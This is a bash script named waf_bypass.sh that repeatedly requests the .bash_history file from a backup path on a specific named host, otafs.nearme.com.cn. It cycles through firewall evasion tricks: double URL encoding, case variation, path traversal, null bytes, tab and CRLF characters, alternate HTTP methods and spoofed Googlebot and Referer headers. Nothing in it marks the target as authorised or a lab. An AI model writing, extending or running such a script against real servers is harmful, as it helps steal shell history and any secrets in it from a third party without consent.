#!/bin/bash
# waf_bypass.sh

echo "[*] Testing WAF Bypass Techniques..."

base_url="https://otafs.nearme.com.cn"
# The target variable is defined but not used in the original script's curl commands.
# It will be used as we refactor.
target_path_segment="gauss-filesbackup-north/otafs"
target_file=".bash_history"

# Function to execute a test and display results
execute_test() {
    local test_name="$1"
    local curl_command="$2"

    echo -e "\n--- $test_name ---"
    # Execute the command and capture status code and output separately
    # The -w flag writes out the HTTP status code after the transfer.
    # We use a delimiter that's unlikely to appear in the response body.
    local delimiter="||STATUS_CODE||"
    local full_response
    full_response=$(eval "$curl_command -s -w '%{http_code}$delimiter%{url_effective}'")

    # Separate status code and body
    local http_status="${full_response%*$delimiter*}"
    # Removing the status code and delimiter from the full response to get the body
    local response_body="${full_response#*$http_status$delimiter}"
    local effective_url="${http_status##*$delimiter}" # get url_effective if needed, currently mixed with status
    http_status="${http_status%%$delimiter*}" # clean up status


    echo "URL: $(eval echo $curl_command | sed -n 's/.*\(http[^ ]*\).*/\1/p')" # Attempt to extract URL from command
    echo "Status Code: $http_status"
    echo "Response (first 200 chars):"
    echo "${response_body:0:200}"
    echo "-------------------------"
}

# Técnica 1: Double URL Encoding
# Original: curl -s "$base_url/gauss-filesbackup-north/otafs/%252e%2562%2561%2573%2568%255f%2568%2569%2573%2574%256f%2572%2579"
# Note: The double encoded string is for ".bash_history" -> %2e%62%61%73%68%5f%68%69%73%74%6f%72%79 -> %252e%2562%2561%2573%2568%255f%2568%2569%2573%2574%256f%2572%2579
execute_test "Test 1: Double URL Encoding" "curl \"$base_url/$target_path_segment/%252e%2562%2561%2573%2568%255f%2568%2569%2573%2574%256f%2572%2579\""

# Técnica 2: Unicode Encoding
# Original: curl -s "$base_url/gauss-filesbackup-north/otafs/\u002e\u0062\u0061\u0073\u0068\u005f\u0068\u0069\u0073\u0074\u006f\u0072\u0079"
# Bash's echo -e handles \u, but curl needs the actual bytes.
# . -> \u002e -> %2e (URL encoded)
# b -> \u0062 -> %62
# a -> \u0061 -> %61
# s -> \u0073 -> %73
# h -> \u0068 -> %68
# _ -> \u005f -> %5f
# h -> \u0068 -> %68
# i -> \u0069 -> %69
# s -> \u0073 -> %73
# t -> \u0074 -> %74
# o -> \u006f -> %6f
# r -> \u0072 -> %72
# y -> \u0079 -> %79
# So, the unicode encoded string for ".bash_history" is effectively %2e%62%61%73%68%5f%68%69%73%74%6f%72%79 (same as single URL encoding)
# For a true Unicode test, one might use overlong UTF-8 or similar, but the original was likely aiming for this.
# The original `echo -e "\u..."` in curl would send literal '\', 'u', '0', '0', '2', 'e' etc.
# We will represent it as standard URL encoding of the unicode points.
execute_test "Test 2: Unicode (as URL encoded UTF-8)" "curl \"$base_url/$target_path_segment/%2e%62%61%73%68%5f%68%69%73%74%6f%72%79\""

# Técnica 3: Case Variation
# Original: curl -s "$base_url/gauss-filesbackup-north/otafs/.BaSh_HiStOrY"
execute_test "Test 3: Case Variation" "curl \"$base_url/$target_path_segment/.BaSh_HiStOrY\""

# Técnica 4: Path Traversal
# Original 1: curl -s "$base_url/gauss-filesbackup-north/otafs/.//.bash_history"
execute_test "Test 4a: Path Traversal (.//)" "curl \"$base_url/$target_path_segment/.//${target_file}\""
# Original 2: curl -s "$base_url/gauss-filesbackup-north/otafs/../otafs/.bash_history"
execute_test "Test 4b: Path Traversal (../otafs/)" "curl \"$base_url/$target_path_segment/../$target_path_segment/${target_file}\""

# Técnica 5: Null Byte
# Original: curl -s "$base_url/gauss-filesbackup-north/otafs/.bash_history%00"
execute_test "Test 5: Null Byte (%00)" "curl \"$base_url/$target_path_segment/${target_file}%00\""

# Técnica 6: Fragment Identifier
# Original: curl -s "$base_url/gauss-filesbackup-north/otafs/.bash_history#"
execute_test "Test 6: Fragment Identifier (#)" "curl \"$base_url/$target_path_segment/${target_file}#\""

# Técnica 7: HTTP Parameter Pollution
# Original: curl -s "$base_url/gauss-filesbackup-north/otafs/.bash_history?file=test"
execute_test "Test 7: HTTP Parameter Pollution (?file=test)" "curl \"$base_url/$target_path_segment/${target_file}?file=test\""

# Técnica 8: Different HTTP Methods
# Original POST: curl -s -X POST "$base_url/gauss-filesbackup-north/otafs/.bash_history"
execute_test "Test 8: POST Method" "curl -X POST \"$base_url/$target_path_segment/${target_file}\""

# Original PUT: curl -s -X PUT "$base_url/gauss-filesbackup-north/otafs/.bash_history"
execute_test "Test 9: PUT Method" "curl -X PUT \"$base_url/$target_path_segment/${target_file}\""

# --- New Techniques ---

# Técnica 10: Tab Character in Path
execute_test "Test 10: Tab Character (%09)" "curl \"$base_url/$target_path_segment/file%09name/${target_file}\"" # Example: file\tname/
execute_test "Test 10b: Tab Character (Leading)" "curl \"$base_url/$target_path_segment/%09${target_file}\""
execute_test "Test 10c: Tab Character (Trailing)" "curl \"$base_url/$target_path_segment/${target_file}%09\""


# Técnica 11: Line Feed / Carriage Return (less likely for path, but for completeness)
execute_test "Test 11a: Line Feed (%0a)" "curl \"$base_url/$target_path_segment/${target_file}%0a\""
execute_test "Test 11b: Carriage Return (%0d)" "curl \"$base_url/$target_path_segment/${target_file}%0d\""

# Técnica 12: Different User-Agent
common_browser_ua="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36"
googlebot_ua="Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"

execute_test "Test 12a: Common Browser User-Agent" "curl -A \"$common_browser_ua\" \"$base_url/$target_path_segment/${target_file}\""
execute_test "Test 12b: Googlebot User-Agent" "curl -A \"$googlebot_ua\" \"$base_url/$target_path_segment/${target_file}\""

# Técnica 13: Referer Header
# Use the base_url as referer, or a sub-path.
execute_test "Test 13: Referer Header" "curl -e \"$base_url/$target_path_segment/\" \"$base_url/$target_path_segment/${target_file}\""

echo -e "\n[*] All tests completed."
